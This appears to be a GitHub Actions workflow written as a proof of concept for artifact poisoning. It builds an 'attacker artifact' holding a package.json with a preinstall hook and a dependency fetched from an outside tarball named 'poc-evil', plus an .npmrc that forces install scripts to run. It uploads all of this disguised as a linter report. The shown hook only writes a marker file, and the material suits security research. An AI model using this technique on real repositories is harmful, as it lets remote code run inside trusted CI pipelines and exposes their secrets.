name: ADP3 Lint Up
on:
  workflow_dispatch:
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: craft attacker artifact payload
        run: |
          mkdir -p payload
          cat > payload/package.json <<'JSON'
          {
            "name": "root-project-poc",
            "version": "1.0.0",
            "private": true,
            "scripts": {
              "preinstall": "echo ROOT_PREINSTALL_RAN > marker-preinstall.txt"
            },
            "dependencies": {
              "poc-evil": "https://raw.githubusercontent.com/PDFtoMark/gab-poc-wfr-artifact/main/poc-evil-1.0.0.tgz"
            }
          }
          JSON
          printf 'dangerously-allow-all-scripts=true\nignore-scripts=false\nforeground-scripts=true\n' > payload/.npmrc
          printf 'attacker report\n' > payload/linter-report.txt
          printf '1\n' > payload/pr-number.txt
      - uses: actions/upload-artifact@v7
        with:
          name: linter-report
          path: payload/
          include-hidden-files: true
          if-no-files-found: error
